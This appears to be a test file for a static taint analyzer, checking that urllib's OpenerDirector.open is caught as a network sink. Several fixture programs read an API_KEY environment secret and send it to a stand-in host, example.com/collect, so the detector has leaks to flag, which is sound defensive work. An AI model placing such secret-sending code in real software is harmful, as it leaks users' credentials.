# SPDX-License-Identifier: AGPL-3.0-or-later
"""WI-dibit: ``urllib.request.OpenerDirector.open`` is rowed where the request is sent.

THE DEFECT. ``opener = urllib.request.build_opener(); opener.open(url, data)``
performs the same send ``urlopen`` performs (``urlopen`` itself ends in
``opener.open(url, data, timeout)``), and no catalogue row sat at it. Two
things were missing, and each alone does nothing:

1. ``build_opener`` is a FUNCTION, so the PascalCase construction rule never
   typed its result: ``opener.open`` arrived as ``python:external:0-0:open``
   and no row could reach it. The ``library_signatures`` row
   ``urllib.request.build_opener: urllib.request.OpenerDirector`` types it
   through WI-kozaj's producer lookup (py.py ``_library_producer_type``).
2. ``urllib.request.OpenerDirector`` carried no row: ``open`` (and ``error``,
   whose default handler chain re-sends on a redirect) are now ``net_send``
   ``methods:`` (ADR-0059: called on an instance), and the class carries its
   own ``module_completeness`` entry so ``add_handler`` / ``close`` are
   examined rather than withholding.

A ``host_secret -> network`` claim over the item's repro read
``confirmed_with_caveats``, a false clean: the secret visibly went out.

THE SECOND SOURCE, PINNED RATHER THAN HIDDEN. WI-bakik rowed ``build_opener``
``env_read`` (it always installs a default ``ProxyHandler``, which reads the
``*_proxy`` variables), and taint models the RECEIVER of a sink as a carrier.
So once ``opener.open`` is a sink, ``build_opener()`` -> ``opener.open(url)``
is a ``host_secret -> network`` flow even with no secret in the arguments: the
proxy configuration the opener read from the environment travels with the
request (``ProxyHandler.proxy_open`` sends ``user:password@`` from a proxy
URL as ``Proxy-Authorization``). WI-bakik counted the ``getproxies()`` ->
``urlopen`` twin of that flow as a real finding. Whether a handle that read
the environment should taint every send through it is an open question
filed as WI-patit; the test below pins today's behaviour so a ruling either
way shows up as a test change.

Every assertion here runs on REAL analyzer output and asserts reach first.
"""
from __future__ import annotations

import contextlib
import io
import json
from pathlib import Path

import pytest

from hypergumbo_core.cli import _rehydrate_io_boundary_edges, main
from hypergumbo_core.io_boundary import load_catalog, tag_io_boundaries
from hypergumbo_core.taint import load_builtin_taint_catalog

_OPENER = "urllib.request.OpenerDirector"

_MODULE_IMPORT = (
    "import os\n"
    "import urllib.request\n"
    "\n"
    "\n"
    "def leak():\n"
    "    secret = os.environ['API_KEY']\n"
    "    opener = urllib.request.build_opener()\n"
    "    opener.open('https://example.com/collect', data=secret.encode())\n"
)

_FROM_IMPORT = (
    "import os\n"
    "from urllib.request import build_opener\n"
    "\n"
    "\n"
    "def leak():\n"
    "    secret = os.environ['API_KEY']\n"
    "    opener = build_opener()\n"
    "    opener.open('https://example.com/collect', secret.encode())\n"
)

#: ``from urllib import request``: a from-imported OWNER (WI-kozaj's rule).
_FROM_URLLIB_REQUEST = (
    "import os\n"
    "from urllib import request\n"
    "\n"
    "\n"
    "def leak():\n"
    "    secret = os.environ['API_KEY']\n"
    "    opener = request.build_opener()\n"
    "    opener.open('https://example.com/collect', secret.encode())\n"
)

#: The opener is built in the caller and sends in the callee.
_THROUGH_A_PARAMETER = (
    "import os\n"
    "import urllib.request\n"
    "\n"
    "\n"
    "def post(opener, payload):\n"
    "    opener.open('https://example.com/collect', payload)\n"
    "\n"
    "\n"
    "def leak():\n"
    "    secret = os.environ['API_KEY']\n"
    "    opener = urllib.request.build_opener()\n"
    "    post(opener, secret.encode())\n"
)

#: The data rides in a ``Request`` (which sends nothing, INV-gujoh).
_REQUEST_OBJECT = (
    "import os\n"
    "import urllib.request\n"
    "\n"
    "\n"
    "def leak():\n"
    "    secret = os.environ['API_KEY']\n"
    "    req = urllib.request.Request('https://example.com/c', data=secret.encode())\n"
    "    opener = urllib.request.build_opener()\n"
    "    opener.open(req)\n"
)

#: Built by hand: ``OpenerDirector()`` + ``add_handler``, no ``build_opener``,
#: so the ``os.environ`` read is the ONLY source in the file.
_HAND_BUILT = (
    "import os\n"
    "import urllib.request\n"
    "\n"
    "\n"
    "def leak():\n"
    "    secret = os.environ['API_KEY']\n"
    "    opener = urllib.request.OpenerDirector()\n"
    "    opener.add_handler(urllib.request.HTTPSHandler())\n"
    "    opener.open('https://example.com/collect', secret.encode())\n"
)

_CLAIMS = """claims:
  - id: secret-no-network
    text: An environment secret is never sent over the network.
    constraint:
      taint_flow:
        source_taint: host_secret
        prohibited_sink_zone: network
"""


def _rows(module: str) -> dict[str, tuple[str, str]]:
    return {p.name: (p.boundary, p.kind)
            for p in load_catalog("python").primitives if p.module == module}


def _tagged(tmp_path: Path, source: str) -> dict:
    """``{(caller, callee module, callee name): (boundary, primitive)}``."""
    from hypergumbo_lang_mainstream.py import analyze_python

    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "mod.py").write_text(source)
    raw = [e.to_dict() for e in analyze_python(repo).edges]
    edges = _rehydrate_io_boundary_edges(raw)
    tag_io_boundaries(edges, {"python": load_catalog("python")})
    out = {}
    for e in edges:
        if e.edge_type != "calls":
            continue
        parts = e.dst.split(":")
        meta = e.meta or {}
        out[(e.src.split(":")[-2], parts[1], parts[-2])] = (
            meta.get("io_boundary"), meta.get("io_primitive"))
    return out


def _verify(tmp_path: Path, source: str, monkeypatch: pytest.MonkeyPatch) -> dict:
    """The one verdict of the shipped ``verify-claims`` over ``source``."""
    repo = tmp_path / "vrepo"
    repo.mkdir()
    (repo / "app.py").write_text(source)
    claims = tmp_path / "claims.yaml"
    claims.write_text(_CLAIMS)
    monkeypatch.setenv("XDG_CACHE_HOME", str(tmp_path / "cache"))
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(io.StringIO()):
        main(["verify-claims", str(repo), "--claims", str(claims), "--format", "json"])
    (verdict,) = json.loads(buf.getvalue())["verdicts"]
    return verdict


def _flows(verdict: dict) -> set[tuple[frozenset, frozenset]]:
    """``{(source primitives, sink primitives)}`` over the verdict's evidence."""
    return {(frozenset(ev["source_primitives"]), frozenset(ev["sink_primitives"]))
            for ev in verdict["evidence"]}


class TestTheRows:

    def test_open_and_error_are_net_send_methods(self) -> None:
        """ADR-0059: ``opener.open(...)`` is called on an INSTANCE."""
        assert _rows(_OPENER) == {"open": ("net_send", "method"),
                                  "error": ("net_send", "method")}

    @pytest.mark.parametrize("name", ["open", "error"])
    def test_each_is_a_network_sink(self, name: str) -> None:
        sinks = {(s.module, s.name): s.zone
                 for s in load_builtin_taint_catalog().sinks_for_language("python")}
        assert sinks.get((_OPENER, name)) == "network"

    def test_the_class_surface_is_enumerated(self) -> None:
        """Exact matching: the ``urllib.request`` slot's grant never reached it."""
        assert load_catalog("python").module_io_is_enumerated(_OPENER)

    def test_the_enumerated_surface_is_the_real_one(self) -> None:
        """The completeness note names four public methods; checked against the
        running interpreter rather than asserted from a doc."""
        import urllib.request

        public = {n for n in dir(urllib.request.OpenerDirector)
                  if not n.startswith("_")}
        assert public == {"add_handler", "close", "error", "open"}, public


class TestTheProducerRow:

    def test_build_opener_return_type_is_declared(self) -> None:
        from hypergumbo_core.library_signatures import load_library_signatures

        sigs = load_library_signatures("python")
        assert sigs["urllib.request.build_opener"] == _OPENER

    def test_the_declared_type_is_the_real_one(self) -> None:
        import urllib.request

        assert type(urllib.request.build_opener()) is urllib.request.OpenerDirector


class TestTheAnalyzedSendClassifies:

    @pytest.mark.parametrize("source", [
        _MODULE_IMPORT, _FROM_IMPORT, _FROM_URLLIB_REQUEST, _REQUEST_OBJECT,
        _HAND_BUILT,
    ], ids=["import-module", "from-import", "from-urllib-import-request",
            "request-object", "hand-built"])
    def test_opener_open_is_net_send(self, tmp_path: Path, source: str) -> None:
        tagged = _tagged(tmp_path, source)
        site = ("leak", _OPENER, "open")
        assert site in tagged, sorted(tagged)  # reach: the receiver is typed
        assert tagged[site] == ("net_send", f"{_OPENER}.open")


class TestTheFindingIsReported:
    """The item's repro at the surface a user reads. Each was
    ``confirmed_with_caveats`` (the hand-built one ``inconclusive``)."""

    @pytest.mark.parametrize("source", [
        _MODULE_IMPORT, _FROM_IMPORT, _FROM_URLLIB_REQUEST, _THROUGH_A_PARAMETER,
        _REQUEST_OBJECT, _HAND_BUILT,
    ], ids=["import-module", "from-import", "from-urllib-import-request",
            "through-a-parameter", "request-object", "hand-built"])
    def test_a_secret_sent_through_an_opener_is_violated(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, source: str,
    ) -> None:
        verdict = _verify(tmp_path, source, monkeypatch)
        assert verdict["verdict"] == "violated", verdict["details"]
        # The SECRET reaches the send, not only build_opener's own env read.
        assert any("os.environ" in src and f"{_OPENER}.open" in snk
                   for src, snk in _flows(verdict)), _flows(verdict)

    def test_control_a_hand_built_opener_with_no_secret_is_confirmed(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """The completeness entry examines ``add_handler`` / ``close``, and the
        typed ``open`` is examined by its row: a clean program reads clean,
        with no untyped-receiver caveat."""
        source = (
            "import urllib.request\n\n\ndef ping():\n"
            "    opener = urllib.request.OpenerDirector()\n"
            "    opener.add_handler(urllib.request.HTTPSHandler())\n"
            "    opener.open('https://example.com/collect', b'ping')\n"
            "    opener.close()\n"
        )
        verdict = _verify(tmp_path, source, monkeypatch)
        assert verdict["verdict"] == "confirmed", (
            verdict["verdict"], verdict["caveats"])

    def test_build_openers_own_env_read_reaches_the_send(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """PINNED, see the module docstring: with no secret in any argument,
        the opener's own ``env_read`` (its default ProxyHandler) reaches
        ``open`` through the receiver."""
        source = (
            "import urllib.request\n\n\ndef fetch():\n"
            "    opener = urllib.request.build_opener()\n"
            "    opener.open('https://example.com/status')\n"
        )
        verdict = _verify(tmp_path, source, monkeypatch)
        assert verdict["verdict"] == "violated", verdict["details"]
        assert _flows(verdict) == {
            (frozenset({"urllib.request.build_opener"}),
             frozenset({f"{_OPENER}.open"})),
        }

    def test_urlopen_is_unchanged(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """The module-level send keeps its row and its finding."""
        source = (
            "import os\nimport urllib.request\n\n\ndef leak():\n"
            "    secret = os.environ['API_KEY']\n"
            "    urllib.request.urlopen('https://example.com/c', secret.encode())\n"
        )
        verdict = _verify(tmp_path, source, monkeypatch)
        assert verdict["verdict"] == "violated", verdict["details"]
        assert _flows(verdict) == {
            (frozenset({"os.environ"}), frozenset({"urllib.request.urlopen"})),
        }
